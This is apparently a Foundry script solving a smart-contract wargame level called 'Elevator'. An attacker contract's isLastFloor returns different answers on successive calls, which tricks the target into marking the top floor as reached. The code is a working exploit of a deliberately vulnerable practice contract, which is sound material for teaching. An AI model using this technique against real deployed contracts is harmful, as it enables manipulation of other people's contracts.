// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "../src/Level11.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Level11Sol is Script{
     Elevator public instance = Elevator(0x8Ad804B2A6907983267C2ef6A962d50F5C63A694);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         new Attack().exploit();
        vm.stopBroadcast();
    }
}
contract Attack{
    Elevator public instance = Elevator(0x8Ad804B2A6907983267C2ef6A962d50F5C63A694);
    uint public floor;
    function exploit() external{
        instance.goTo(3);
    }
    function isLastFloor(uint _floor)external returns(bool){
        if(floor == _floor){
            return true;           
        }
         floor = _floor;
        return false;
    }
}